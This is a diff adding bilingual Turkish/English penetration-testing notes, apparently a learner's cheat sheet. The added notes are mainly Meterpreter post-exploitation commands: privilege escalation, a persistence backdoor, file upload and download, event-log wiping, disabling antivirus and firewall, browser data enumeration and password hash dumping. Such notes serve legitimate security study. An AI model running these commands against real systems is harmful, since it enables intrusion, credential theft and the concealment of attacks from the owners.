@@ -245,3 +245,34 @@ java resim tarama=> java -jar stegsolve.jar-->çalışır (java picture scan)
 --PROXYCHAINS--
 mousepad /etc/proxychains.conf açıp içine socks5 127.0.0.1 1080 eklememiz gerekir. (add socks5 127.0.0.1 in proxychains.conf)
 proxychains4 nmap -p80,8080 $ip/24 => subnetmaskları tarar (alt alan ağlarını) => (scanning subnetmasks)
+
+--METERPRETER--
+sessions -i 1 =>1nolu oturuma geçiş(go to session no 1)
+getuid => yetki (authority)
+getsystem =>yetki yükseltme 1.yöntem (update authority from user to admin update)
+ps => çalışan dosyalar (running files)
+migrate => psteki idno ile yetki yükseltme 2.yöntem (privilege escalation second method)
+msfconsole => 3.yöntem (third method)
+privilege escalation
+exploit suggester modülleri post exploit yapılır.(Using exploit suggester and doing post exploit)
+sysinfo => sistem bilgileri (system info)
+background => arkaplana atar (transition to background)
+run persistance -h => kalıcı arka kapı (persistance backdoor)
+run persistence -A(dinlemeye alınca bağlantı kur)(when listening connect) -V(oturum açınca bağlantı kur)(when signing in connect the target system) -i(süre)(time) 35sn.(second) -P 5555(port) -r(ip)
+sysinfo
+getuid
+search -f *.txt => tüm txtleri bulur. (find all *.txt files)
+upload -r /home/kali/Desktop/dosya.exe “C:\Users\Windows7x86\Desktop” => hedefe dosya yükler. (upload files to target)
+download -r dosya yolu + nereye yüklenecek yolu (download files from target)
+clearev=>yüksek yetki varsa siler logları (if we have admin authority on target system we can delete all logs with this code)
+kill -s => meterpreter oturumu sonlandırılır. (kill the session of meterpreter)
+run_event_manager -c -->log siler (delete logs)
+
+
+run getcountermeasure -h -->post/windows/manage/killav -d , -k firewall ve antivirüs kapatır. (close the antivirus and firewall)
+
+run enum-chrome
+run enum-firefox
+run post/windows/gather/enum-chrome
+hashdump=>şifre hashlerini döker (dump the hash and passwords)
+run get_application_list=>kurulu program ve versiyonları öğrenme. (learn program and version info)
